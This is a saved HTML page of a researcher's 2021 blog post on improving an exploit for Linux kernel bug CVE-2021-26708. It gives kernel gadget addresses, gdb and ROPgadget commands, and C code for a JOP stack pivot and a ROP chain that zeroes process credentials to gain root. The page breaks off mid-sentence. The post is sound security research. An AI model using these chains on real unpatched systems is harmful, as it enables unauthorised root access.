<!DOCTYPE html>
<!-- saved from url=(0055)https://a13xp0p0v.github.io/2021/08/25/lkrg-bypass.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="apple-touch-icon" sizes="180x180" href="https://a13xp0p0v.github.io/img/favicons/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="https://a13xp0p0v.github.io/img/favicons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://a13xp0p0v.github.io/img/favicons/favicon-16x16.png">
  <link rel="manifest" href="https://a13xp0p0v.github.io/img/favicons/site.webmanifest">
  <link rel="shortcut icon" href="https://a13xp0p0v.github.io/img/favicons/favicon.ico">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="msapplication-config" content="/img/favicons/browserconfig.xml">
  <meta name="theme-color" content="#ffffff">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Improving the exploit for CVE-2021-26708 in the Linux kernel to bypass LKRG | Alexander Popov</title>
<meta name="generator" content="Jekyll v3.9.0">
<meta property="og:title" content="Improving the exploit for CVE-2021-26708 in the Linux kernel to bypass LKRG">
<meta property="og:locale" content="en_US">
<meta name="description" content="This is the follow-up to my research described in the article &quot;Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel.&quot; My PoC exploit for CVE-2021-26708 had a very limited facility for privilege escalation, and I decided to continue my experiments with that vulnerability. This article describes how I improved the exploit, added a full-power ROP chain, and implemented a new method of bypassing the Linux Kernel Runtime Guard (LKRG).">
<meta property="og:description" content="This is the follow-up to my research described in the article &quot;Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel.&quot; My PoC exploit for CVE-2021-26708 had a very limited facility for privilege escalation, and I decided to continue my experiments with that vulnerability. This article describes how I improved the exploit, added a full-power ROP chain, and implemented a new method of bypassing the Linux Kernel Runtime Guard (LKRG).">
<link rel="canonical" href="https://a13xp0p0v.github.io/2021/08/25/lkrg-bypass.html">
<meta property="og:url" content="https://a13xp0p0v.github.io/2021/08/25/lkrg-bypass.html">
<meta property="og:site_name" content="Alexander Popov">
<meta property="og:image" content="https://a13xp0p0v.github.io/img/ava_bg.jpg">
<meta property="og:type" content="article">
<meta property="article:published_time" content="2021-08-25T10:37:00+00:00">
<meta name="twitter:card" content="summary">
<meta property="twitter:image" content="https://a13xp0p0v.github.io/img/ava_bg.jpg">
<meta property="twitter:title" content="Improving the exploit for CVE-2021-26708 in the Linux kernel to bypass LKRG">
<meta name="twitter:site" content="@a13xp0p0v">
<script type="application/ld+json">
{"headline":"Improving the exploit for CVE-2021-26708 in the Linux kernel to bypass LKRG","dateModified":"2021-08-25T10:37:00+00:00","description":"This is the follow-up to my research described in the article &quot;Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel.&quot; My PoC exploit for CVE-2021-26708 had a very limited facility for privilege escalation, and I decided to continue my experiments with that vulnerability. This article describes how I improved the exploit, added a full-power ROP chain, and implemented a new method of bypassing the Linux Kernel Runtime Guard (LKRG).","datePublished":"2021-08-25T10:37:00+00:00","url":"https://a13xp0p0v.github.io/2021/08/25/lkrg-bypass.html","@type":"BlogPosting","image":"https://a13xp0p0v.github.io/img/ava_bg.jpg","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://a13xp0p0v.github.io/img/ava_bg.jpg"}},"mainEntityOfPage":{"@type":"WebPage","@id":"https://a13xp0p0v.github.io/2021/08/25/lkrg-bypass.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="./2021 - Improving the exploit for CVE-2021-26708 in the Linux kernel to bypass LKRG_files/main.css"><link type="application/atom+xml" rel="alternate" href="https://a13xp0p0v.github.io/feed.xml" title="Alexander Popov"></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="https://a13xp0p0v.github.io/"><img id="logo" src="./2021 - Improving the exploit for CVE-2021-26708 in the Linux kernel to bypass LKRG_files/a13xp0p0v_ava.png" height="60px"> Alexander Popov</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger">
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="https://a13xp0p0v.github.io/about/">About</a><a class="page-link" href="https://a13xp0p0v.github.io/articles/">Articles</a><a class="page-link" href="https://a13xp0p0v.github.io/conference_talks/">Conference Talks</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Improving the exploit for CVE-2021-26708 in the Linux kernel to bypass LKRG</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2021-08-25T10:37:00+00:00" itemprop="datePublished">Aug 25, 2021
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>This is the follow-up to my research described in the article "<a href="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html">Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel</a>." My PoC exploit for CVE-2021-26708 had a very limited facility for privilege escalation, and I decided to continue my experiments with that vulnerability. This article describes how I improved the exploit, added a full-power ROP chain, and implemented a new method of bypassing the <a href="https://github.com/openwall/lkrg">Linux Kernel Runtime Guard</a> (LKRG).</p>

<p>Today, I gave <a href="https://zeronights.ru/en/reports-en/improving-the-exploit-for-cve-2021-26708-in-the-linux-kernel-to-bypass-lkrg/">a talk at ZeroNights 2021</a> on this topic (<a href="https://a13xp0p0v.github.io/img/CVE-2021-26708_LKRG_bypass.pdf">slides</a>). Prepare for lots of assembly. Let's go!</p>

<p>First of all, the PoC demo <a href="https://youtu.be/O6rsuGVXkmE">video</a>:</p>
<div style="position:relative;padding-top:56.25%;">
  <iframe src="./2021 - Improving the exploit for CVE-2021-26708 in the Linux kernel to bypass LKRG_files/O6rsuGVXkmE.html" frameborder="0" allowfullscreen="" style="position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>
</div>
<p><br></p>

<h2 id="limited-privilege-escalation">Limited privilege escalation</h2>

<p>In the <a href="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html">first article</a>, I described how the race condition in Linux virtual sockets can be leveraged for 4-byte memory corruption, which I gradually turned into arbitrary read/write of kernel memory. In this section, I will briefly summarize how the privilege escalation was gained and why it is limited (see the <a href="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html">first article</a> for more details).</p>

<p>Arbitrary write was performed via control-flow hijack using the <code class="language-plaintext highlighter-rouge">destructor_arg</code> callback of an overwritten <code class="language-plaintext highlighter-rouge">sk_buff</code> kernel object:</p>

<center><img src="./2021 - Improving the exploit for CVE-2021-26708 in the Linux kernel to bypass LKRG_files/skb_payload.png" width="85%"></center>
<p><br></p>

<p>This callback has the following prototype:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">callback</span><span class="p">)(</span><span class="k">struct</span> <span class="n">ubuf_info</span> <span class="o">*</span><span class="p">,</span> <span class="n">bool</span> <span class="n">zerocopy_success</span><span class="p">);</span>
</code></pre></div></div>

<p>When the kernel calls it in <a href="https://elixir.bootlin.com/linux/v5.10/source/include/linux/skbuff.h#L1470"><code class="language-plaintext highlighter-rouge">skb_zcopy_clear()</code></a>, the <code class="language-plaintext highlighter-rouge">RDI</code> register stores the first function argument, which is the address of the <code class="language-plaintext highlighter-rouge">ubuf_info</code> structure itself. The <code class="language-plaintext highlighter-rouge">RSI</code> register stores the second function argument, which is <code class="language-plaintext highlighter-rouge">1</code>.</p>

<p>The contents of <code class="language-plaintext highlighter-rouge">ubuf_info</code> are controlled by the attacker, which is great. However, the first 8 bytes of it are occupied by the callback function pointer. You can see this on the diagram above. That's a severe constraint! So, for stack pivoting, the ROP gadget should look like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov rsp, qword ptr [rdi + 8] ; ret
</code></pre></div></div>

<p>Unfortunately, there is nothing similar to that in the Fedora kernel binary <code class="language-plaintext highlighter-rouge">vmlinuz-5.10.11-200.fc33.x86_64</code>. With <a href="https://github.com/JonathanSalwan/ROPgadget"><code class="language-plaintext highlighter-rouge">ROPgadget</code></a>, however, I found a single gadget that fits these constraints and performs arbitrary write without stack pivoting:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
</code></pre></div></div>

<p>As I mentioned earlier, <code class="language-plaintext highlighter-rouge">RDI</code> stores the address of the kernel memory with data controlled by the attacker. <code class="language-plaintext highlighter-rouge">RSI</code> stores 1 and <code class="language-plaintext highlighter-rouge">RCX</code> stores 0. In other words, this gadget writes seven bytes with 0 and one byte with 1 at the memory address controlled by the attacker. For privilege escalation, my PoC exploit wrote zero to <code class="language-plaintext highlighter-rouge">uid</code>, <code class="language-plaintext highlighter-rouge">gid</code>, <code class="language-plaintext highlighter-rouge">effective uid</code>, and <code class="language-plaintext highlighter-rouge">effective gid</code> in the process credentials.</p>

<p>I was happy to have invented this strange arbitrary write primitive and managed to perform privilege escalation! However, I was not satisfied with this solution because it didn't provide me the full power of ROP. Moreover, I had to hijack the kernel control-flow twice to overwrite all the requisite fields in <code class="language-plaintext highlighter-rouge">struct cred</code>. That decreased the exploit stability.</p>

<p>I had some rest and then decided to explore available ROP gadgets once again.</p>

<h2 id="registers-under-attacker-control">Registers under attacker control</h2>

<p>First of all, I revisited the state of CPU registers at the moment of the control-flow hijack. I inserted the breakpoint into <a href="https://elixir.bootlin.com/linux/v5.10/source/include/linux/skbuff.h#L1470"><code class="language-plaintext highlighter-rouge">skb_zcopy_clear()</code></a> that executes the <code class="language-plaintext highlighter-rouge">destructor_arg</code> callback:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>gdb vmlinux
<span class="gp">gdb-peda$</span><span class="w"> </span>target remote :1234
<span class="gp">gdb-peda$</span><span class="w"> </span><span class="nb">break</span> ./include/linux/skbuff.h:1481
</code></pre></div></div>

<p>This is what the debugger shows when the kernel hits the breakpoint and is about to execute the callback:</p>

<center><img src="./2021 - Improving the exploit for CVE-2021-26708 in the Linux kernel to bypass LKRG_files/control_flow_hijack_regs.png" width="100%"></center>
<p><br></p>

<p>Which kernel pointers do the CPU registers store? <code class="language-plaintext highlighter-rouge">RDI</code> and <code class="language-plaintext highlighter-rouge">R8</code> contain the <code class="language-plaintext highlighter-rouge">ubuf_info</code> pointer mentioned earlier. Dereferencing that pointer gives the callback function pointer that is loaded to <code class="language-plaintext highlighter-rouge">RAX</code>. <code class="language-plaintext highlighter-rouge">R9</code> stores the address of some kernel stack memory (it's close to the <code class="language-plaintext highlighter-rouge">RSP</code> value). The <code class="language-plaintext highlighter-rouge">R12</code> and <code class="language-plaintext highlighter-rouge">R14</code> registers contain an address in the kernel heap, but I don't know the object it points to.</p>

<p>Additionally, the <code class="language-plaintext highlighter-rouge">RBP</code> register contains the address of <code class="language-plaintext highlighter-rouge">skb_shared_info</code>. This is the address of my <code class="language-plaintext highlighter-rouge">sk_buff</code> object from <code class="language-plaintext highlighter-rouge">kmalloc-4k</code> plus <code class="language-plaintext highlighter-rouge">SKB_SHINFO_OFFSET</code>, which is <code class="language-plaintext highlighter-rouge">3776</code> or <code class="language-plaintext highlighter-rouge">0xec0</code> (see more info on that in the <a href="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html">first article</a>).</p>

<p>This kernel address in the <code class="language-plaintext highlighter-rouge">RBP</code> register filled me with hope again because it points to the kernel memory under the attacker's control. So, I started to search for ROP/JOP gadgets that can exploit it.</p>

<h2 id="mysterious-jop-gadgets">Mysterious JOP gadgets</h2>

<p>I started to examine all gadgets involving <code class="language-plaintext highlighter-rouge">RBP</code> and eventually found a lot of JOP gadgets that look like this one:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffffffff81711d33 : xchg eax, esp ; jmp qword ptr [rbp + 0x48]
</code></pre></div></div>

<p>Cool, <code class="language-plaintext highlighter-rouge">RBP + 0x48</code> points to the kernel memory under the attacker's control. I understood that I could perform stack pivoting using <strong>a chain of JOP gadgets like this</strong> and then proceed with ordinary ROP. Excellent!</p>

<p>For a quick experiment, I took this <code class="language-plaintext highlighter-rouge">xchg eax, esp ; jmp qword ptr [rbp + 0x48]</code> gadget, which sets the kernel stack pointer to the userspace memory. First, I double-checked that this gadget resides in the kernel code. Yes, the code of <code class="language-plaintext highlighter-rouge">acpi_idle_lpi_enter()</code> starts at <code class="language-plaintext highlighter-rouge">0xffffffff81711d30</code>, and the gadget appears if we look at the code of that function with a three-byte offset:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gdb vmlinux

gdb-peda$ disassemble 0xffffffff81711d33
Dump of assembler code for function acpi_idle_lpi_enter:
   0xffffffff81711d30 &lt;+0&gt;:	call   0xffffffff810611c0 &lt;__fentry__&gt;
   0xffffffff81711d35 &lt;+5&gt;:	mov    rcx,QWORD PTR gs:[rip+0x7e915f4b]
   0xffffffff81711d3d &lt;+13&gt;:	test   rcx,rcx
   0xffffffff81711d40 &lt;+16&gt;:	je     0xffffffff81711d5e &lt;acpi_idle_lpi_enter+46&gt;

gdb-peda$ x/2i 0xffffffff81711d33
   0xffffffff81711d33 &lt;acpi_idle_lpi_enter+3&gt;:	xchg   esp,eax
   0xffffffff81711d34 &lt;acpi_idle_lpi_enter+4&gt;:	jmp    QWORD PTR [rbp+0x48]
</code></pre></div></div>

<p>However, when I tried to call this gadget during the control-flow hijack, the kernel crashed with a page fault. I spent some time trying to debug it and also asked my friend <a href="https://twitter.com/andreyknvl">Andrey Konovalov</a> whether he had encountered such things in his experience with ROP/JOP. Andrey noticed that some bytes of the code dump printed in the kernel crash report differ from the output of <code class="language-plaintext highlighter-rouge">objdump</code> for the kernel binary.</p>

<center><img src="./2021 - Improving the exploit for CVE-2021-26708 in the Linux kernel to bypass LKRG_files/missing_gadget.png" width="100%"></center>
<p><br></p>

<p>This was the first time in my practice with the Linux kernel, when this code dump from a crash report proved useful :) I attached the debugger to the live kernel and saw that the code of the <code class="language-plaintext highlighter-rouge">acpi_idle_lpi_enter()</code> kernel function had actually changed:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gdb vmlinux
gdb-peda$ target remote :1234

gdb-peda$ disassemble 0xffffffff81711d33
Dump of assembler code for function acpi_idle_lpi_enter:
   0xffffffff81711d30 &lt;+0&gt;:	nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffff81711d35 &lt;+5&gt;:	mov    rcx,QWORD PTR gs:[rip+0x7e915f4b]
   0xffffffff81711d3d &lt;+13&gt;:	test   rcx,rcx
   0xffffffff81711d40 &lt;+16&gt;:	je     0xffffffff81711d5e &lt;acpi_idle_lpi_enter+46&gt;

gdb-peda$ x/2i 0xffffffff81711d33
   0xffffffff81711d33 &lt;acpi_idle_lpi_enter+3&gt;:	add    BYTE PTR [rax],al
   0xffffffff81711d35 &lt;acpi_idle_lpi_enter+5&gt;:	mov    rcx,QWORD PTR gs:[rip+0x7e915f4b]
</code></pre></div></div>

<p>In fact, the Linux kernel can patch its code in the runtime. In this particular case, the code of <code class="language-plaintext highlighter-rouge">acpi_idle_lpi_enter()</code> is changed by <a href="https://elixir.bootlin.com/linux/v5.10/source/Documentation/trace/ftrace.rst"><code class="language-plaintext highlighter-rouge">CONFIG_DYNAMIC_FTRACE</code></a>. This kernel mechanism actually changed many JOP gadgets that interested me! So, I decided to search for ROP/JOP gadgets in the memory of the live virtual machine to avoid such patched cases.</p>

<center><img src="./2021 - Improving the exploit for CVE-2021-26708 in the Linux kernel to bypass LKRG_files/surgeon.jpg" width="85%">
<br>Evgeny Korneev: Portrait of Academician Lev Bogush (1980)
</center>
<p><br></p>

<p>I tried the <code class="language-plaintext highlighter-rouge">ropsearch</code> command of the <code class="language-plaintext highlighter-rouge">gdb-peda</code> tool, but it didn't work for me because of its limited functionality. Then I used another approach and dumped the whole kernel code region into a file using the <code class="language-plaintext highlighter-rouge">gdb-peda dumpmem</code> command. First, I determined the kernel code location on the virtual machine:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[root@localhost ~]#</span><span class="w"> </span><span class="nb">grep</span> <span class="s2">"_text"</span> /proc/kallsyms
<span class="go">ffffffff81000000 T _text
</span><span class="gp">[root@localhost ~]#</span><span class="w"> </span><span class="nb">grep</span> <span class="s2">"_etext"</span> /proc/kallsyms 
<span class="go">ffffffff81e026d7 T _etext
</span></code></pre></div></div>

<p>Then I dumped the memory between <code class="language-plaintext highlighter-rouge">_text</code> and <code class="language-plaintext highlighter-rouge">_etext</code> plus the remainder:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gdb-peda$</span><span class="w"> </span>dumpmem kerndump 0xffffffff81000000 0xffffffff81e03000
<span class="go">Dumped 14692352 bytes to 'kerndump'
</span></code></pre></div></div>

<p>After this, searching for ROP/JOP gadgets in the raw memory dump with <a href="https://github.com/JonathanSalwan/ROPgadget"><code class="language-plaintext highlighter-rouge">ROPgadget</code></a> was possible with additional options (kudos to my friend <a href="https://twitter.com/h0t_max">Maxim Goryachy</a> for that tip):</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="w"> </span>./ROPgadget.py <span class="nt">--binary</span> kerndump <span class="nt">--rawArch</span><span class="o">=</span>x86 <span class="nt">--rawMode</span><span class="o">=</span>64 <span class="o">&gt;</span> rop_gadgets_5.10.11_kerndump
</code></pre></div></div>

<p>After that, I was ready to construct a JOP/ROP chain for stack pivoting.</p>

<h2 id="joprop-chain-for-stack-pivoting">JOP/ROP chain for stack pivoting</h2>

<p>I examined the gadgets with <code class="language-plaintext highlighter-rouge">RBP</code> left in the kernel memory dump and I managed to construct the stack pivoting chain:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* JOP/ROP gadget chain for stack pivoting: */</span>

<span class="cm">/* mov ecx, esp ; cwde ; jmp qword ptr [rbp + 0x48] */</span>
<span class="cp">#define STACK_PIVOT_1_MOV_ECX_ESP_JMP		(0xFFFFFFFF81768A43lu + kaslr_offset)
</span>
<span class="cm">/* push rdi ; jmp qword ptr [rbp - 0x75] */</span>
<span class="cp">#define STACK_PIVOT_2_PUSH_RDI_JMP		(0xFFFFFFFF81B5FD0Alu + kaslr_offset)
</span>
<span class="cm">/* pop rsp ; pop rbx ; ret */</span>
<span class="cp">#define STACK_PIVOT_3_POP_RSP_POP_RBX_RET	(0xFFFFFFFF8165E33Flu + kaslr_offset)
</span></code></pre></div></div>

<ol>
  <li>
    <p>The first JOP gadget saves the lower 32 bits of <code class="language-plaintext highlighter-rouge">RSP</code> (the stack pointer register) to <code class="language-plaintext highlighter-rouge">ECX</code> and jumps to the next location in the controlled memory. This is important because the shellcode should restore the original <code class="language-plaintext highlighter-rouge">RSP</code> value in the end. Unfortunately, there is no similar JOP gadget that can save the whole <code class="language-plaintext highlighter-rouge">RSP</code> value. That said, I have managed with half of it, I'll describe my trick very soon.</p>
  </li>
  <li>
    <p>The second JOP gadget pushes the address of <code class="language-plaintext highlighter-rouge">ubuf_info</code> in <code class="language-plaintext highlighter-rouge">RDI</code> to the kernel stack and also jumps to the next location in the kernel memory controlled by the attacker.</p>
  </li>
  <li>
    <p>Finally, the third ROP gadget sets the stack pointer to the address of the <code class="language-plaintext highlighter-rouge">ubuf_info</code> structure. Then it executes one more <code class="language-plaintext highlighter-rouge">pop</code> instruction, which adds 8 bytes to the address in <code class="language-plaintext highlighter-rouge">RSP</code>. This is important because the first 8 bytes in <code class="language-plaintext highlighter-rouge">ubuf_info</code> contain the address of the first JOP gadget, as I described earlier. However, after the second <code class="language-plaintext highlighter-rouge">pop</code> instruction, <code class="language-plaintext highlighter-rouge">RSP</code> points to the beginning of the full-power ROP chain. The stack pivoting is done!</p>
  </li>
</ol>

<p>That's how the exploit prepares this chain in the memory for overwriting the <code class="language-plaintext highlighter-rouge">sk_buff</code> kernel object:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* mov ecx, esp ; cwde ; jmp qword ptr [rbp + 0x48] */</span>
<span class="n">uinfo_p</span><span class="o">-&gt;</span><span class="n">callback</span> <span class="o">=</span> <span class="n">STACK_PIVOT_1_MOV_ECX_ESP_JMP</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">jmp_addr_1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">xattr_addr</span> <span class="o">+</span> <span class="n">SKB_SHINFO_OFFSET</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">);</span>
<span class="cm">/* push rdi ; jmp qword ptr [rbp - 0x75] */</span>
<span class="o">*</span><span class="n">jmp_addr_1</span> <span class="o">=</span> <span class="n">STACK_PIVOT_2_PUSH_RDI_JMP</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">jmp_addr_2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">xattr_addr</span> <span class="o">+</span> <span class="n">SKB_SHINFO_OFFSET</span> <span class="o">-</span> <span class="mh">0x75</span><span class="p">);</span>
<span class="cm">/* pop rsp ; pop rbx ; ret */</span>
<span class="o">*</span><span class="n">jmp_addr_2</span> <span class="o">=</span> <span class="n">STACK_PIVOT_3_POP_RSP_POP_RBX_RET</span><span class="p">;</span>
</code></pre></div></div>

<p>Take a look at the diagram that explains what this code is doing:</p>

<center><img src="./2021 - Improving the exploit for CVE-2021-26708 in the Linux kernel to bypass LKRG_files/skb_payload_jop_chain.png" width="100%"></center>
<p><br></p>

<h2 id="rop-for-eop">ROP for EoP</h2>

<p>When I achieved the stack pivoting, I quickly reimplemented the elevation of privileges (EoP) using ordinary ROP:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">rop_gadget</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">xattr_addr</span> <span class="o">+</span> <span class="n">MY_UINFO_OFFSET</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="cp">#define ROP_POP_RAX_RET			(0xFFFFFFFF81015BF4lu + kaslr_offset)
#define ROP_MOV_QWORD_PTR_RAX_0_RET	(0xFFFFFFFF8112E6D7lu + kaslr_offset)
</span>
<span class="cm">/* 1. Perform privilege escalation */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_POP_RAX_RET</span><span class="p">;</span>		<span class="cm">/* pop rax ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">owner_cred</span> <span class="o">+</span> <span class="n">CRED_UID_GID_OFFSET</span><span class="p">;</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_MOV_QWORD_PTR_RAX_0_RET</span><span class="p">;</span>	<span class="cm">/* mov qword ptr [rax], 0 ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_POP_RAX_RET</span><span class="p">;</span>		<span class="cm">/* pop rax ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">owner_cred</span> <span class="o">+</span> <span class="n">CRED_EUID_EGID_OFFSET</span><span class="p">;</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_MOV_QWORD_PTR_RAX_0_RET</span><span class="p">;</span>	<span class="cm">/* mov qword ptr [rax], 0 ; ret */</span>
</code></pre></div></div>

<p>This is simple: the <code class="language-plaintext highlighter-rouge">owner_cred</code> kernel address was leaked to the userspace using arbitrary read (the <a href="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html">first article</a> describes that in details), and this part of the ROP chain overwrites <code class="language-plaintext highlighter-rouge">uid</code>, <code class="language-plaintext highlighter-rouge">gid</code>, <code class="language-plaintext highlighter-rouge">effective uid</code>, and <code class="language-plaintext highlighter-rouge">effective gid</code> in the kernel credentials with <code class="language-plaintext highlighter-rouge">0</code>, which means the superuser.</p>

<p>Then, the ROP chain has to restore the original <code class="language-plaintext highlighter-rouge">RSP</code> value and continue the system call handling. How did I achieve it? The lower 32 bits of the original stack pointer have been saved in <code class="language-plaintext highlighter-rouge">RCX</code>. The upper 32 bits of it can be extracted from <code class="language-plaintext highlighter-rouge">R9</code> (this register stores an address from the kernel stack, as you can see in the <code class="language-plaintext highlighter-rouge">gdb</code> screenshot that I displayed earlier). Some bit twiddling and we are done:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define ROP_MOV_RAX_R9_RET		(0xFFFFFFFF8106BDA4lu + kaslr_offset)
#define ROP_POP_RDX_RET			(0xFFFFFFFF8105ED4Dlu + kaslr_offset)
#define ROP_AND_RAX_RDX_RET		(0xFFFFFFFF8101AD34lu + kaslr_offset)
#define ROP_ADD_RAX_RCX_RET		(0xFFFFFFFF8102BA35lu + kaslr_offset)
#define ROP_PUSH_RAX_POP_RBX_RET	(0xFFFFFFFF810D64D1lu + kaslr_offset)
#define ROP_PUSH_RBX_POP_RSP_RET	(0xFFFFFFFF810749E9lu + kaslr_offset)
</span>
<span class="cm">/* 2. Restore RSP and continue */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_MOV_RAX_R9_RET</span><span class="p">;</span>	    <span class="cm">/* mov rax, r9 ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_POP_RDX_RET</span><span class="p">;</span>	    <span class="cm">/* pop rdx ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff00000000lu</span><span class="p">;</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_AND_RAX_RDX_RET</span><span class="p">;</span>	    <span class="cm">/* and rax, rdx ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_ADD_RAX_RCX_RET</span><span class="p">;</span>	    <span class="cm">/* add rax, rcx ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_PUSH_RAX_POP_RBX_RET</span><span class="p">;</span> <span class="cm">/* push rax ; pop rbx ; ret */</span>
<span class="n">rop_gadget</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROP_PUSH_RBX_POP_RSP_RET</span><span class="p">;</span> <span class="cm">/* push rbx ; add eax, 0x415d0060 ; pop rsp ; ret*/</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">R9</code> value is copied to <code class="language-plaintext highlighter-rouge">RAX</code>. The <code class="language-plaintext highlighter-rouge">0xffffffff00000000</code> bit mask is saved in <code class="language-plaintext highlighter-rouge">RDX</code>. Then the bitwise <code class="language-plaintext highlighter-rouge">AND</code> operation is performed for <code class="language-plaintext highlighter-rouge">RAX</code> and <code class="language-plaintext highlighter-rouge">RDX</code>. As a result, <code class="language-plaintext highlighter-rouge">RAX</code> contains the upper bits of the original stack pointer. After adding the <code class="language-plaintext highlighter-rouge">RCX</code> value, the <code class="language-plaintext highlighter-rouge">RAX</code> register contains the original <code class="language-plaintext highlighter-rouge">RSP</code> value, which is then loaded to <code class="language-plaintext highlighter-rouge">RSP</code> via <code class="language-plaintext highlighter-rouge">RBX</code> (unfortunately there is no <code class="language-plaintext highlighter-rouge">mov rsp, 